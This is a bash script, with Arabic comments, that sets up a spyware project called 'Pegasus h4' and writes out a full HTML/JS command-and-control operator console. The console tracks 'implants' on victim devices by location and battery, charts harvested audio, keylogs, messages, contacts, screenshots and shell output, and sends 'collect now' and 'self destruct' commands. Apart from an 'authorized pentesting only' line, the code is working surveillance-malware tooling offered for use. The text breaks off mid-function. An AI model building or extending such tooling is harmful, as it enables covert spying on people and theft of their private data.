#!/bin/bash
# ============================================================
# Pegasus h4 — نظام المراقبة عن بعد (Authorized Pentesting Only)
# ينشئ الهيكل الكامل مع واجهة HTML+JS في ملف واحد
# ============================================================

set -e

PROJECT_DIR="pegasus-h4"
UI_FILE="pegasus-ui.html"
H4_SERVER_DIR="$PROJECT_DIR/server"
AGENT_DIR="$PROJECT_DIR/agent"
DROPPER_DIR="$PROJECT_DIR/dropper"

# الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

info() { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; }

mkdir -p "$PROJECT_DIR" "$H4_SERVER_DIR" "$AGENT_DIR" "$DROPPER_DIR"

# ============================================================
# 1. واجهة HTML+JS في ملف واحد
# ============================================================
info "إنشاء واجهة HTML+JS في ملف واحد..."

cat > "$UI_FILE" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pegasus h4 — نظام القيادة والتحكم</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
:root {
  --bg-primary: #0a0a0f;
  --bg-secondary: #12121a;
  --bg-tertiary: #1a1a2e;
  --accent: #00d4ff;
  --accent2: #7b2ff7;
  --danger: #ff2d55;
  --success: #34c759;
  --warning: #ff9500;
  --text: #e0e0e0;
  --text2: #888899;
  --text3: #555566;
  --border: #2a2a3e;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: var(--bg-primary);
  color: var(--text);
  min-height: 100vh;
  overflow-x: hidden;
}
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg-secondary); }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

/* Header */
.header {
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  padding: 0 24px;
  height: 60px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: sticky;
  top: 0;
  z-index: 100;
  backdrop-filter: blur(20px);
}
.logo { display: flex; align-items: center; gap: 12px; }
.logo-icon {
  width: 36px; height: 36px;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-weight: bold; font-size: 14px;
}
.logo-text { font-weight: 600; font-size: 18px; }
.nav { display: flex; gap: 4px; }
.nav a {
  padding: 8px 16px; border-radius: 8px;
  font-size: 14px; color: var(--text2);
  text-decoration: none; transition: all 0.2s;
}
.nav a:hover, .nav a.active { background: var(--bg-tertiary); color: var(--accent); }
.header-right { display: flex; align-items: center; gap: 16px; }
.status-dot {
  width: 8px; height: 8px; border-radius: 50%;
  background: var(--success); display: inline-block;
  animation: pulse 2s infinite;
}
@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.4; }
}
.status-text { font-size: 12px; color: var(--text2); }
.user-info { font-size: 13px; color: var(--text2); }
.logout-btn {
  padding: 6px 14px; border-radius: 6px;
  background: var(--bg-tertiary); color: var(--text2);
  border: none; cursor: pointer; font-size: 12px;
  transition: all 0.2s;
}
.logout-btn:hover { background: var(--border); color: var(--text); }

/* Main Layout */
.container { max-width: 1400px; margin: 0 auto; padding: 24px; }

/* Stats Grid */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 16px;
  margin-bottom: 24px;
}
.stat-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
  transition: all 0.2s;
}
.stat-card:hover {
  border-color: var(--accent);
  box-shadow: 0 0 20px rgba(0,212,255,0.08);
  transform: translateY(-2px);
}
.stat-title { font-size: 12px; color: var(--text2); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
.stat-value { font-size: 28px; font-weight: 700; }
.stat-value .unit { font-size: 14px; font-weight: 400; color: var(--text2); }
.stat-trend { font-size: 12px; margin-top: 4px; }
.trend-up { color: var(--success); }
.trend-down { color: var(--danger); }

/* Charts Row */
.charts-row {
  display: grid;
  grid-template-columns: 2fr 1fr;
  gap: 16px;
  margin-bottom: 24px;
}
@media (max-width: 900px) {
  .charts-row { grid-template-columns: 1fr; }
}
.chart-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
}
.chart-title { font-size: 16px; font-weight: 600; margin-bottom: 16px; }

/* Bar Chart */
.bar-chart { display: flex; flex-direction: column; gap: 8px; }
.bar-row { display: flex; align-items: center; gap: 8px; }
.bar-label { font-size: 12px; color: var(--text2); width: 100px; text-align: left; }
.bar-track {
  flex: 1; height: 24px;
  background: var(--bg-tertiary); border-radius: 4px;
  overflow: hidden; position: relative;
}
.bar-fill {
  height: 100%; border-radius: 4px;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  transition: width 0.6s ease;
  position: relative;
}
.bar-value {
  position: absolute; right: 8px; top: 50%;
  transform: translateY(-50%);
  font-size: 11px; color: white; font-weight: 600;
}

/* Country List */
.country-list { display: flex; flex-direction: column; gap: 8px; }
.country-row { display: flex; justify-content: space-between; align-items: center; padding: 4px 0; }
.country-name { font-size: 13px; color: var(--text2); }
.country-count { font-size: 13px; color: var(--text); font-family: monospace; }

/* Map + Activity */
.map-activity-row {
  display: grid;
  grid-template-columns: 2fr 1fr;
  gap: 16px;
  margin-bottom: 24px;
}
@media (max-width: 900px) {
  .map-activity-row { grid-template-columns: 1fr; }
}
.map-container {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
  height: 400px;
  position: relative;
  overflow: hidden;
}
#map-canvas {
  width: 100%;
  height: calc(100% - 40px);
  border-radius: 8px;
  background: #0d1117;
  position: relative;
  overflow: hidden;
}
.map-marker {
  position: absolute;
  width: 12px; height: 12px;
  border-radius: 50%;
  transform: translate(-50%, -50%);
  box-shadow: 0 0 8px rgba(0,212,255,0.5);
  cursor: pointer;
  transition: transform 0.2s;
}
.map-marker:hover { transform: translate(-50%, -50%) scale(1.5); z-index: 10; }
.map-marker.online { background: var(--success); }
.map-marker.offline { background: var(--text3); }
.map-marker.self_destructed { background: var(--danger); }
.map-tooltip {
  position: absolute;
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 8px 12px;
  font-size: 12px;
  pointer-events: none;
  z-index: 20;
  display: none;
  white-space: nowrap;
}

.activity-feed { height: 400px; overflow-y: auto; }
.activity-item {
  padding: 8px 12px;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
}
.activity-time { color: var(--text3); font-family: monospace; font-size: 11px; }
.activity-text { color: var(--text2); margin-top: 2px; }
.activity-text strong { color: var(--text); }

/* Table */
.table-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
}
.table-toolbar {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}
.search-input {
  background: var(--bg-primary);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 8px 14px;
  color: var(--text);
  font-size: 13px;
  width: 240px;
}
.search-input::placeholder { color: var(--text3); }
.filter-select {
  background: var(--bg-primary);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 8px 14px;
  color: var(--text);
  font-size: 13px;
}
.table-count { font-size: 13px; color: var(--text2); margin-left: auto; }
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 13px;
}
th {
  text-align: left;
  padding: 10px 12px;
  color: var(--text2);
  font-weight: 500;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
td {
  padding: 10px 12px;
  border-bottom: 1px solid var(--border);
}
tr:hover td { background: rgba(26,26,46,0.5); }
.badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 3px 10px;
  border-radius: 20px;
  font-size: 11px;
  border: 1px solid;
}
.badge-online { background: rgba(52,199,89,0.15); color: var(--success); border-color: rgba(52,199,89,0.3); }
.badge-offline { background: rgba(136,136,153,0.15); color: var(--text2); border-color: rgba(136,136,153,0.3); }
.badge-self_destructed { background: rgba(255,45,85,0.15); color: var(--danger); border-color: rgba(255,45,85,0.3); }
.badge-dot {
  width: 6px; height: 6px; border-radius: 50%;
  display: inline-block;
}
.badge-online .badge-dot { background: var(--success); animation: pulse 2s infinite; }
.battery-bar {
  width: 60px; height: 6px;
  background: var(--bg-tertiary);
  border-radius: 3px;
  overflow: hidden;
  display: inline-block;
  vertical-align: middle;
}
.battery-fill {
  height: 100%;
  border-radius: 3px;
  transition: width 0.3s;
}
.btn {
  padding: 5px 12px;
  border-radius: 6px;
  border: none;
  cursor: pointer;
  font-size: 11px;
  transition: all 0.2s;
}
.btn-primary { background: rgba(0,212,255,0.15); color: var(--accent); }
.btn-primary:hover { background: rgba(0,212,255,0.25); }
.btn-accent { background: rgba(123,47,247,0.15); color: var(--accent2); }
.btn-accent:hover { background: rgba(123,47,247,0.25); }
.btn-danger { background: rgba(255,45,85,0.15); color: var(--danger); }
.btn-danger:hover { background: rgba(255,45,85,0.25); }
.actions { display: flex; gap: 4px; justify-content: flex-end; }

/* Login */
.login-container {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: var(--bg-primary);
}
.login-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 40px;
  width: 400px;
  max-width: 90%;
}
.login-logo {
  display: flex; align-items: center; justify-content: center; gap: 12px;
  margin-bottom: 32px;
}
.login-title { font-size: 24px; font-weight: 700; }
.login-subtitle { text-align: center; color: var(--text2); font-size: 14px; margin-bottom: 24px; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 13px; color: var(--text2); margin-bottom: 6px; }
.form-group input {
  width: 100%;
  padding: 10px 14px;
  background: var(--bg-primary);
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--text);
  font-size: 14px;
}
.form-group input:focus { outline: none; border-color: var(--accent); }
.login-btn {
  width: 100%;
  padding: 12px;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  border: none;
  border-radius: 8px;
  color: white;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s;
}
.login-btn:hover { opacity: 0.9; }
.login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
.error-msg { color: var(--danger); font-size: 13px; margin-top: 8px; text-align: center; }

/* Loading */
.loading-screen {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
.spinner {
  width: 40px; height: 40px;
  border: 3px solid var(--border);
  border-top-color: var(--accent);
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* Implant Detail */
.detail-header {
  display: flex; align-items: center; gap: 16px;
  margin-bottom: 24px;
}
.detail-back {
  color: var(--accent); text-decoration: none;
  font-size: 14px; display: flex; align-items: center; gap: 4px;
}
.detail-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
}
@media (max-width: 768px) { .detail-grid { grid-template-columns: 1fr; } }
.detail-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
}
.detail-card h3 { font-size: 14px; color: var(--text2); margin-bottom: 12px; }
.detail-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid var(--border); }
.detail-row:last-child { border-bottom: none; }
.detail-label { color: var(--text2); }
.detail-value { color: var(--text); font-family: monospace; }

/* Tabs */
.tabs { display: flex; gap: 4px; margin-bottom: 16px; border-bottom: 1px solid var(--border); }
.tab {
  padding: 8px 20px;
  cursor: pointer;
  font-size: 13px;
  color: var(--text2);
  border-bottom: 2px solid transparent;
  transition: all 0.2s;
}
.tab:hover { color: var(--text); }
.tab.active { color: var(--accent); border-bottom-color: var(--accent); }

/* Command Builder */
.cmd-builder { display: flex; flex-direction: column; gap: 12px; }
.cmd-row { display: flex; gap: 8px; align-items: center; }
.cmd-row select, .cmd-row input {
  background: var(--bg-primary);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 8px 12px;
  color: var(--text);
  font-size: 13px;
}
.cmd-row select { min-width: 140px; }
.cmd-row input[type="text"] { flex: 1; }

/* Toast */
.toast {
  position: fixed;
  bottom: 24px; left: 50%;
  transform: translateX(-50%);
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px 24px;
  font-size: 13px;
  z-index: 999;
  display: none;
  animation: slideUp 0.3s ease;
}
@keyframes slideUp {
  from { transform: translateX(-50%) translateY(20px); opacity: 0; }
  to { transform: translateX(-50%) translateY(0); opacity: 1; }
}
.toast.show { display: block; }
.toast.success { border-color: var(--success); }
.toast.error { border-color: var(--danger); }

/* Modules */
.module-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
  gap: 12px;
}
.module-card {
  background: var(--bg-tertiary);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px;
  text-align: center;
  transition: all 0.2s;
}
.module-card:hover { border-color: var(--accent); }
.module-icon { font-size: 24px; margin-bottom: 8px; }
.module-name { font-size: 13px; font-weight: 600; }
.module-status { font-size: 11px; margin-top: 4px; }
.module-active { color: var(--success); }
.module-inactive { color: var(--text3); }

/* Empty state */
.empty-state {
  text-align: center;
  padding: 40px;
  color: var(--text3);
  font-size: 14px;
}
</style>
</head>
<body>
<div id="app"></div>

<script>
// ============================================================
// API Configuration
// ============================================================
const API = {
  BASE: window.location.origin + '/api',
  WS: window.location.origin.replace(/^http/, 'ws') + '/api/operator/ws',
  TOKEN: localStorage.getItem('pegasus_token') || '',
  
  async request(method, path, body = null) {
    const opts = {
      method,
      headers: { 'Content-Type': 'application/json' },
    };
    if (this.TOKEN) opts.headers['Authorization'] = `Bearer ${this.TOKEN}`;
    if (body) opts.body = JSON.stringify(body);
    
    const url = `${this.BASE}${path}`;
    const res = await fetch(url, opts);
    if (res.status === 401) {
      localStorage.removeItem('pegasus_token');
      localStorage.removeItem('pegasus_user');
      renderLogin();
      throw new Error('Unauthorized');
    }
    if (!res.ok) {
      const err = await res.json().catch(() => ({ error: res.statusText }));
      throw new Error(err.error || 'Request failed');
    }
    return res.json();
  },
  get(path) { return this.request('GET', path); },
  post(path, body) { return this.request('POST', path, body); },
  put(path, body) { return this.request('PUT', path, body); },
  del(path) { return this.request('DELETE', path); },
  
  login(username, password) {
    return this.post('/operator/login', { username, password });
  },
  
  getStats() { return this.get('/operator/dashboard/stats'); },
  getImplants(status = '') {
    let path = '/operator/implants';
    if (status) path += `?status=${status}`;
    return this.get(path);
  },
  getImplant(id) { return this.get(`/operator/implants/${id}`); },
  getMapData() { return this.get('/operator/dashboard/map'); },
  getData(params = {}) {
    const q = new URLSearchParams();
    if (params.type) q.set('type', params.type);
    if (params.limit) q.set('limit', params.limit);
    if (params.implant_id) q.set('implant_id', params.implant_id);
    return this.get(`/operator/data?${q}`);
  },
  sendCommand(implantIds, type, payload = {}) {
    return this.post('/operator/commands', { implant_ids: implantIds, type, payload });
  },
  getTimeline() { return this.get('/operator/dashboard/timeline'); },
  
  connectWS(onMessage) {
    if (this._ws) this._ws.close();
    this._ws = new WebSocket(this.WS + '?token=' + this.TOKEN);
    this._ws.onmessage = (e) => {
      try { onMessage(JSON.parse(e.data)); } catch {}
    };
    this._ws.onclose = () => {
      setTimeout(() => this.connectWS(onMessage), 5000);
    };
    return () => this._ws?.close();
  }
};

// ============================================================
// State Management
// ============================================================
const state = {
  stats: null,
  implants: [],
  mapPoints: [],
  timeline: [],
  currentView: 'dashboard',
  currentImplant: null,
  implantDetail: null,
  tab: 'overview',
  search: '',
  filter: 'all',
  loading: true,
  error: null,
  toast: null,
  
  set(key, value) { this[key] = value; render(); },
  update(partial) { Object.assign(this, partial); render(); },
  setLoading(v) { this.loading = v; render(); }
};

// ============================================================
// Router
// ============================================================
function navigate(view, params = {}) {
  state.currentView = view;
  state.currentImplant = params.id || null;
  state.tab = params.tab || 'overview';
  
  // Update URL
  const path = view === 'dashboard' ? '/' : 
               view === 'implant' ? `/implant/${params.id}` :
               view === 'data' ? '/data' :
               view === 'map' ? '/map' :
               view === 'commands' ? '/commands' : '/';
  window.history.pushState({}, '', path);
  
  loadView();
}

window.addEventListener('popstate', () => {
  const path = window.location.pathname;
  if (path.startsWith('/implant/')) {
    navigate('implant', { id: path.split('/')[2] });
  } else if (path === '/data') { navigate('data'); }
  else if (path === '/map') { navigate('map'); }
  else if (path === '/commands') { navigate('commands'); }
  else { navigate('dashboard'); }
});

// ============================================================
// Load View Data
// ============================================================
async function loadView() {
  state.loading = true;
  render();
  
  try {
    switch (state.currentView) {
      case 'dashboard':
        const [stats, implants, mapData, timeline] = await Promise.all([
          API.getStats().catch(() => null),
          API.getImplants().catch(() => ({ implants: [] })),
          API.getMapData().catch(() => ({ points: [] })),
          API.getTimeline().catch(() => ({ events: [] })),
        ]);
        state.stats = stats;
        state.implants = implants?.implants || [];
        state.mapPoints = mapData?.points || [];
        state.timeline = timeline?.events || [];
        break;
        
      case 'implant':
        if (state.currentImplant) {
          state.implantDetail = await API.getImplant(state.currentImplant);
        }
        break;
        
      case 'data':
        const dataRes = await API.getData({ limit: 100 });
        state._dataItems = dataRes?.data || [];
        break;
    }
  } catch (e) {
    state.error = e.message;
  }
  
  state.loading = false;
  render();
}

// ============================================================
// Toast
// ============================================================
function showToast(msg, type = 'success') {
  state.toast = { msg, type };
  render();
  setTimeout(() => { state.toast = null; render(); }, 3000);
}

// ============================================================
// Render Functions
// ============================================================
function render() {
  const app = document.getElementById('app');
  
  if (!API.TOKEN) {
    renderLoginView(app);
    return;
  }
  
  if (state.loading) {
    renderLoading(app);
    return;
  }
  
  switch (state.currentView) {
    case 'dashboard': renderDashboard(app); break;
    case 'implant': renderImplantDetail(app); break;
    case 'data': renderDataView(app); break;
    case 'map': renderMapView(app); break;
    case 'commands': renderCommandsView(app); break;
    default: renderDashboard(app);
  }
  
  // Toast overlay
  if (state.toast) {
    const toast = document.createElement('div');
    toast.className = `toast show ${state.toast.type}`;
    toast.textContent = state.toast.msg;
    app.appendChild(toast);
  }
}

function renderLoginView(app) {
  app.innerHTML = `
    <div class="login-container">
      <div class="login-card">
        <div class="login-logo">
          <div class="logo-icon">P</div>
          <div class="login-title">Pegasus h4</div>
        </div>
        <div class="login-subtitle">نظام القيادة والتحكم — دخول المشغلين</div>
        <form id="loginForm">
          <div class="form-group">
            <label>اسم المستخدم</label>
            <input type="text" id="username" placeholder="operator" required>
          </div>
          <div class="form-group">
            <label>كلمة المرور</label>
            <input type="password" id="password" placeholder="••••••••" required>
          </div>
          <button type="submit" class="login-btn" id="loginBtn">دخول</button>
          <div id="loginError" class="error-msg"></div>
        </form>
      </div>
    </div>
  `;
  
  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = document.getElementById('loginBtn');
    const errEl = document.getElementById('loginError');
    btn.disabled = true;
    btn.textContent = 'جاري الدخول...';
    errEl.textContent = '';
    
    try {
      const res = await API.login(
        document.getElementById('username').value,
        document.getElementById('password').value
      );
      API.TOKEN = res.token;
      localStorage.setItem('pegasus_token', res.token);
      localStorage.setItem('pegasus_user', JSON.stringify({
        id: res.user_id, username: res.username, role: res.role
      }));
      state.loading = true;
      loadView();
    } catch (e) {
      errEl.textContent = e.message || 'فشل الدخول';
      btn.disabled = false;
      btn.textContent = 'دخول';
    }
  });
}

function renderLoading(app) {
  app.innerHTML = `
    <div class="loading-screen">
      <div class="spinner"></div>
    </div>
  `;
}

function renderHeader() {
  const user = JSON.parse(localStorage.getItem('pegasus_user') || '{}');
  return `
    <header class="header">
      <div style="display:flex;align-items:center;gap:32px;">
        <div class="logo">
          <div class="logo-icon">P</div>
          <div class="logo-text">Pegasus h4</div>
        </div>
        <nav class="nav">
          <a href="/" class="${state.currentView === 'dashboard' ? 'active' : ''}" onclick="event.preventDefault();navigate('dashboard')">الرئيسية</a>
          <a href="/data" class="${state.currentView === 'data' ? 'active' : ''}" onclick="event.preventDefault();navigate('data')">البيانات</a>
          <a href="/map" class="${state.currentView === 'map' ? 'active' : ''}" onclick="event.preventDefault();navigate('map')">الخريطة</a>
          <a href="/commands" class="${state.currentView === 'commands' ? 'active' : ''}" onclick="event.preventDefault();navigate('commands')">الأوامر</a>
        </nav>
      </div>
      <div class="header-right">
        <span class="status-dot"></span>
        <span class="status-text">نشط</span>
        <span class="user-info">${user.username || 'operator'}</span>
        <button class="logout-btn" onclick="logout()">خروج</button>
      </div>
    </header>
  `;
}

function formatBytes(bytes) {
  if (!bytes || bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function timeAgo(ts) {
  const secs = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
  if (secs < 60) return 'الآن';
  if (secs < 3600) return `${Math.floor(secs/60)}د`;
  if (secs < 86400) return `${Math.floor(secs/3600)}س`;
  return `${Math.floor(secs/86400)}ي`;
}

function renderDashboard(app) {
  const s = state.stats || {};
  const dataTypes = s.data_by_type || {};
  const typeNames = Object.keys(dataTypes);
  const maxVal = Math.max(...Object.values(dataTypes), 1);
  
  app.innerHTML = `
    ${renderHeader()}
    <div class="container">
      <!-- Stats Grid -->
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-title">إجمالي الزرعات</div>
          <div class="stat-value">${s.total_implants || 0}</div>
          <div class="stat-trend trend-up">${s.new_today || 0} جديد اليوم</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">نشط الآن</div>
          <div class="stat-value">${s.online_now || 0}</div>
          <div class="stat-trend ${(s.online_now || 0) > 0 ? 'trend-up' : ''}">${((s.online_now || 0) / (s.total_implants || 1) * 100).toFixed(0)}% من الإجمالي</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">البيانات المجمعة</div>
          <div class="stat-value">${formatBytes(s.data_collected_bytes)}</div>
          <div class="stat-trend trend-up">مشفر بالكامل</div>
        </div>
        <div class="stat-card">
          <div class="stat-title">أوامر نشطة</div>
          <div class="stat-value">${s.active_commands || 0}</div>
          <div class="stat-trend">${s.geographic_spread || 0} دولة</div>
        </div>
      </div>
      
      <!-- Charts Row -->
      <div class="charts-row">
        <div class="chart-card">
          <div class="chart-title">توزيع البيانات حسب النوع</div>
          <div class="bar-chart" id="dataChart"></div>
        </div>
        <div class="chart-card">
          <div class="chart-title">التوزيع الجغرافي</div>
          <div class="country-list" id="countryList"></div>
        </div>
      </div>
      
      <!-- Map + Activity -->
      <div class="map-activity-row">
        <div class="map-container">
          <div class="chart-title">الخريطة الحية</div>
          <div id="map-canvas"></div>
        </div>
        <div class="chart-card activity-feed">
          <div class="chart-title">النشاط الأخير</div>
          <div id="activityFeed"></div>
        </div>
      </div>
      
      <!-- Implants Table -->
      <div class="table-card">
        <div class="chart-title">الزرعات النشطة</div>
        <div class="table-toolbar">
          <input type="text" class="search-input" placeholder="بحث..." value="${state.search}" oninput="state.search=this.value;render()">
          <select class="filter-select" onchange="state.filter=this.value;render()">
            <option value="all" ${state.filter === 'all' ? 'selected' : ''}>الكل</option>
            <option value="online" ${state.filter === 'online' ? 'selected' : ''}>نشط</option>
            <option value="offline" ${state.filter === 'offline' ? 'selected' : ''}>غير نشط</option>
            <option value="self_destructed" ${state.filter === 'self_destructed' ? 'selected' : ''}>مدمر</option>
          </select>
          <span class="table-count">${state.implants.length} زرعة</span>
        </div>
        <div id="implantsTableBody"></div>
      </div>
    </div>
  `;
  
  // Populate chart
  const chartEl = document.getElementById('dataChart');
  const colorMap = {
    'audio': '#00d4ff', 'keylog': '#7b2ff7', 'location': '#34c759',
    'file': '#ff9500', 'screenshot': '#ff2d55', 'message': '#5ac8fa',
    'contact': '#af52de', 'shell_output': '#ff6482'
  };
  chartEl.innerHTML = typeNames.length === 0 
    ? '<div class="empty-state">لا توجد بيانات بعد</div>'
    : typeNames.map(t => `
      <div class="bar-row">
        <span class="bar-label">${t}</span>
        <div class="bar-track">
          <div class="bar-fill" style="width:${(dataTypes[t]/maxVal*100).toFixed(0)}%;background:${colorMap[t] || '#00d4ff'}">
            <span class="bar-value">${dataTypes[t]}</span>
          </div>
        </div>
      </div>
    `).join('');
  
  // Populate countries
  const countries = (s.top_countries || []);
  document.getElementById('countryList').innerHTML = countries.length === 0
    ? '<div class="empty-state">لا توجد مواقع</div>'
    : countries.map(c => `
      <div class="country-row">
        <span class="country-name">${c.country}</span>
        <span class="country-count">${c.count}</span>
      </div>
    `).join('');
  
  // Render map
  renderMapOnCanvas(state.mapPoints);
  
  // Populate activity
  const feedEl = document.getElementById('activityFeed');
  if (state.timeline.length === 0) {
    feedEl.innerHTML = '<div class="empty-state">لا يوجد نشاط حديث</div>';
  } else {
    feedEl.innerHTML = state.timeline.slice(0, 50).map(e => `
      <div class="activity-item">
        <div class="activity-time">${timeAgo(e.timestamp)}</div>
        <div class="activity-text"><strong>${e.type}</strong> — ${e.sub_type || ''}</div>
      </div>
    `).join('');
  }
  
  // Populate table
  renderImplantsTable();
}

function renderMapOnCanvas(points) {
  const canvas = document.getElementById('map-canvas');
  if (!canvas || !points || points.length === 0) {
    if (canvas) canvas.innerHTML = '<div class="empty-state" style="padding:80px 0">لا توجد مواقع متاحة</div>';
    return;
  }
  
  // Simple map rendering using CSS positioning
  // Normalize coordinates to fit the container
  const lats = points.map(p => p.lat);
  const lons = points.map(p => p.lon);
  const minLat = Math.min(...lats);
  const maxLat = Math.max(...lats);
  const minLon = Math.min(...lons);
  const maxLon = Math.max(...lons);
  const latRange = maxLat - minLat || 1;
  const lonRange = maxLon - minLon || 1;
  
  // Dark grid background
  let gridSvg = '';
  for (let i = 0; i < 12; i++) {
    const pct = (i / 12) * 100;
    gridSvg += `<line x1="${pct}%" y1="0" x2="${pct}%" y2="100%" stroke="#1a1a2e" stroke-width="1"/>`;
    gridSvg += `<line x1="0" y1="${pct}%" x2="100%" y2="${pct}%" stroke="#1a1a2e" stroke-width="1"/>`;
  }
  
  canvas.innerHTML = `
    <svg width="100%" height="100%" style="position:absolute;top:0;left:0">
      ${gridSvg}
      ${points.map((p, i) => {
        const x = ((p.lon - minLon) / lonRange) * 90 + 5;
        const y = 95 - ((p.lat - minLat) / latRange) * 90;
        const statusClass = p.status === 'online' ? '#34c759' : p.status === 'offline' ? '#555566' : '#ff2d55';
        return `
          <circle cx="${x}%" cy="${y}%" r="4" fill="${statusClass}" opacity="0.9">
            <title>${p.device} (${p.status})</title>
          </circle>
          <circle cx="${x}%" cy="${y}%" r="8" fill="${statusClass}" opacity="0.2">
            <animate attributeName="r" values="6;12;6" dur="2s" repeatCount="indefinite"/>
          </circle>
        `;
      }).join('')}
    </svg>
  `;
}

function renderImplantsTable() {
  const tbody = document.getElementById('implantsTableBody');
  if (!tbody) return;
  
  let filtered = state.implants;
  if (state.filter !== 'all') filtered = filtered.filter(i => i.status === state.filter);
  if (state.search) filtered = filtered.filter(i => 
    i.device_name?.toLowerCase().includes(state.search.toLowerCase())
  );
  
  if (filtered.length === 0) {
    tbody.innerHTML = '<div class="empty-state">لا توجد زرعات</div>';
    return;
  }
  
  let html = '<table><thead><tr>';
  html += '<th>الجهاز</th><th>المنصة</th><th>الحالة</th><th>آخر ظهور</th><th>البطارية</th><th>البلد</th><th></th>';
  html += '</tr></thead><tbody>';
  
  filtered.forEach(imp => {
    const statusClass = `badge-${imp.status}`;
    const batteryColor = imp.battery_level > 50 ? '#34c759' : imp.battery_level > 20 ? '#ff9500' : '#ff2d55';
    html += `<tr>
      <td>
        <div style="font-weight:600">${imp.device_name || 'Unknown'}</div>
        <div style="font-size:11px;color:var(--text3);font-family:monospace">${imp.id?.slice(0,12) || '—'}...</div>
      </td>
      <td style="color:var(--text2);font-size:12px">${imp.platform || '—'} ${imp.os_version || ''}</td>
      <td><span class="badge ${statusClass}"><span class="badge-dot"></span>${imp.status}</span></td>
      <td style="color:var(--text2);font-size:12px">${timeAgo(imp.last_seen)}</td>
      <td>
        <div class="battery-bar"><div class="battery-fill" style="width:${Math.max(imp.battery_level||0,0)}%;background:${batteryColor}"></div></div>
        <span style="font-size:11px;color:var(--text2);margin-left:4px">${imp.battery_level || '—'}%</span>
      </td>
      <td style="color:var(--text2)">${imp.country || '—'}</td>
      <td class="actions">
        <button class="btn btn-primary" onclick="navigate('implant',{id:'${imp.id}'})">تفاصيل</button>
        <button class="btn btn-accent" onclick="collectNow('${imp.id}')">جمع</button>
        <button class="btn btn-danger" onclick="selfDestruct('${imp.id}')">تدمير</button>
      </td>
    </tr>`;
  });
  
  html += '</tbody></table>';
  tbody.innerHTML = html;
}

async function collectNow(id) {
  try {
    await API.sendCommand([id], 'collect_now', { module: 'all' });
    showToast('تم إرسال أمر الجمع', 'success');
  } catch (e) {
    showToast('فشل: ' + e.message, 'error');
  }
}

async function selfDestruct(id) {
  if (!confirm('هل أنت متأكد من إرسال أمر التدمير الذاتي؟\nلا يمكن التراجع عن هذا الإجراء.')) return;
  try {
    await API.sendCommand([id], 'self_destruct');
    showToast('تم إرسال أمر التدمير الذاتي', 'success');
  } catch (e) {
    showToast('فشل: ' + e.message, 'error');
  }
}

function renderImplantDetail(app) {
  const imp = state.implantDetail?.implant || {};
  const telemetry = state.implantDetail?.telemetry || [];
  
  app.innerHTML = `
    ${renderHeader()}
    <div class="container">
      <div class="detail-header">
        <a href="/" class="detail-back" onclick="event.preventDefault();navigate('dashboard')">← العودة</a>
